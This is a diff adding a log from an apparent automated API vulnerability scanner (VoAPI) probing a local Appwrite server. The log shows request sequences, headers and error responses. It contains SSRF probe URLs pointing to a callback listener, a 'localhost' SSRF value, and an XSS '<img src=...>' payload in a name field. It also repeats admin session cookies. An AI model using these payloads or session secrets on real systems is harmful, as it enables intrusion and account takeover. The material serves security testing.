@@ -1,0 +1,907 @@
+----------------VoAPI Start-----------------------
+##############
+candidate_api_seq: [<VoAPITemplate.ApiTemplate object at 0x7f39580e7040>, <VoAPITemplate.ApiTemplate object at 0x7f39580e7c70>]
+/account Get
+/account/name Patch
+candidate_api_seq_relations: ---------------
+producer_api: /account Get
+producer_param: name
+consumer_api: /account/name Patch
+consumer_param: name
+------------
+candidate_api_test_types: {'display_api': ['name']}
+----------------Send: -----------------------
+send request: get http://192.168.1.118/v1/account
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {}
+request_data: {}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+##############
+candidate_api_seq: [<VoAPITemplate.ApiTemplate object at 0x7f39580e7040>, <VoAPITemplate.ApiTemplate object at 0x7f39580018b0>]
+/account Get
+/account/recovery Post
+candidate_api_seq_relations: ---------------
+producer_api: /account Get
+producer_param: email
+consumer_api: /account/recovery Post
+consumer_param: email
+------------
+candidate_api_test_types: {'proxy_api': ['url']}
+----------------Send: -----------------------
+send request: get http://192.168.1.118/v1/account
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {}
+request_data: {}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+##############
+candidate_api_seq: [<VoAPITemplate.ApiTemplate object at 0x7f39580e7040>, <VoAPITemplate.ApiTemplate object at 0x7f39580018b0>, <VoAPITemplate.ApiTemplate object at 0x7f3957f389a0>]
+/account Get
+/account/recovery Post
+/account/recovery Put
+candidate_api_seq_relations: ---------------
+producer_api: /account/recovery Post
+producer_param: secret
+consumer_api: /account/recovery Put
+consumer_param: secret
+------------
+producer_api: /account/recovery Post
+producer_param: userId
+consumer_api: /account/recovery Put
+consumer_param: userId
+------------
+producer_api: /account Get
+producer_param: email
+consumer_api: /account/recovery Post
+consumer_param: email
+------------
+candidate_api_test_types: {'database_api': ['userId']}
+----------------Send: -----------------------
+send request: get http://192.168.1.118/v1/account
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {}
+request_data: {}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+##############
+candidate_api_seq: [<VoAPITemplate.ApiTemplate object at 0x7f395764d940>]
+/account/verification Post
+candidate_api_seq_relations: ---------------
+candidate_api_test_types: {'proxy_api': ['url']}
+----------------Send: -----------------------
+send request: post http://192.168.1.118/v1/account/verification
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {}
+request_data: {'url': 'http://192.168.1.118:4444/ssrf/account/verificationVoAPIurl'}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+----------------Send: -----------------------
+send request: post http://192.168.1.118/v1/account/verification
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {}
+request_data: {'url': 'https://192.168.1.118:4445/ssrf/account/verificationVoAPIurl'}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+##############
+candidate_api_seq: [<VoAPITemplate.ApiTemplate object at 0x7f395764d940>, <VoAPITemplate.ApiTemplate object at 0x7f39579588b0>]
+/account/verification Post
+/account/verification Put
+candidate_api_seq_relations: ---------------
+producer_api: /account/verification Post
+producer_param: secret
+consumer_api: /account/verification Put
+consumer_param: secret
+------------
+producer_api: /account/verification Post
+producer_param: userId
+consumer_api: /account/verification Put
+consumer_param: userId
+------------
+candidate_api_test_types: {'database_api': ['userId']}
+----------------Send: -----------------------
+send request: post http://192.168.1.118/v1/account/verification
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {}
+request_data: {'url': 'http://localhost'}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+##############
+candidate_api_seq: [<VoAPITemplate.ApiTemplate object at 0x7f39580e4850>]
+/avatars/favicon Get
+candidate_api_seq_relations: ---------------
+candidate_api_test_types: {'proxy_api': ['url']}
+----------------Send: -----------------------
+send request: get http://192.168.1.118/v1/avatars/favicon
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {'url': 'http://192.168.1.118:4444/ssrf/avatars/faviconVoAPIurl'}
+request_data: {}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+----------------Send: -----------------------
+send request: get http://192.168.1.118/v1/avatars/favicon
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {'url': 'https://192.168.1.118:4445/ssrf/avatars/faviconVoAPIurl'}
+request_data: {}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+##############
+candidate_api_seq: [<VoAPITemplate.ApiTemplate object at 0x7f3957649730>]
+/avatars/image Get
+candidate_api_seq_relations: ---------------
+candidate_api_test_types: {'proxy_api': ['url']}
+----------------Send: -----------------------
+send request: get http://192.168.1.118/v1/avatars/image
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {'url': 'http://192.168.1.118:4444/ssrf/avatars/imageVoAPIurl', 'width': 14, 'height': 4}
+request_data: {}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+----------------Send: -----------------------
+send request: get http://192.168.1.118/v1/avatars/image
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {'url': 'https://192.168.1.118:4445/ssrf/avatars/imageVoAPIurl', 'width': 32, 'height': 43}
+request_data: {}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+##############
+candidate_api_seq: [<VoAPITemplate.ApiTemplate object at 0x7f395761d250>]
+/avatars/initials Get
+candidate_api_seq_relations: ---------------
+candidate_api_test_types: {'display_api': ['name']}
+----------------Send: -----------------------
+send request: get http://192.168.1.118/v1/avatars/initials
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {'name': "<img src='http://192.168.1.118:4444/xss/avatars/initialsVoAPIname'>", 'width': 4, 'height': 21, 'color': 'VoAPITestString0', 'background': 'VoAPITestString13'}
+request_data: {}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+----------------Send: -----------------------
+send request: get http://192.168.1.118/v1/avatars/initials
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {'name': "<img src='https://192.168.1.118:4445/xss/avatars/initialsVoAPIname'>", 'width': 32, 'height': 14, 'color': 'VoAPITestString20', 'background': 'VoAPITestString14'}
+request_data: {}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+----------------Send: -----------------------
+send request: get http://192.168.1.118/v1/avatars/initials
